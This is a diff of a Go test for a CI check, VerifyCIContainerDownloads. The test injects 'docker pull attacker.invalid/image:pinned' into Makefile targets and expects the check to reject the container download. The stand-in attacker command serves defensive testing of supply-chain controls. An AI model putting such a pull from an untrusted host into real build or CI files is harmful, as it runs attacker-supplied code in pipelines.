@@ -8,21 +8,24 @@ import (
 )
 
 func TestVerifyCIContainerDownloadsRejectsSourceBoundCommandWhoseMakeTargetAcquiresContainers(t *testing.T) {
-	root := writeCIContainerDownloadsFixture(t)
-	buildPath := filepath.Join(root, "mk", "build.mk")
-	writeFixtureFile(t, buildPath, ".PHONY: android\nandroid:\n\tdocker pull attacker.invalid/image:pinned\n")
-	makefilePath := filepath.Join(root, "Makefile")
-	writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/build.mk\n")
-	writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), `name: android
-on: push
-jobs:
-  run:
-    runs-on: ubuntu-latest
-    steps:
-      - run: make android
-`)
-	if err := VerifyCIContainerDownloads(root); err == nil {
-		t.Fatal("VerifyCIContainerDownloads accepted a source-bound command after its Make target acquired containers")
+	for _, target := range []string{"android-profile", "android"} {
+		t.Run(target, func(t *testing.T) {
+			root := writeCIContainerDownloadsFixture(t)
+			buildPath := filepath.Join(root, "mk", "android.mk")
+			baseline := ".PHONY: android-profile android\nandroid-profile:\n\t@true\nandroid:\n\t@true\n"
+			writeFixtureFile(t, buildPath, baseline)
+			makefilePath := filepath.Join(root, "Makefile")
+			writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/android.mk\n")
+			workflowPath := filepath.Join(root, ".github", "workflows", "ci-android.yml")
+			writeFixtureFile(t, workflowPath, readRepositoryWorkflow(t, "ci-android.yml"))
+			if err := VerifyCIContainerDownloads(root); err != nil {
+				t.Fatalf("baseline source authority must pass: %v", err)
+			}
+			writeFixtureFile(t, buildPath, strings.Replace(baseline, target+":\n\t@true", target+":\n\tdocker pull attacker.invalid/image:pinned", 1))
+			if err := VerifyCIContainerDownloads(root); err == nil {
+				t.Fatal("VerifyCIContainerDownloads accepted container acquisition through the Android profile or wrapped gate")
+			}
+		})
 	}
 }
 
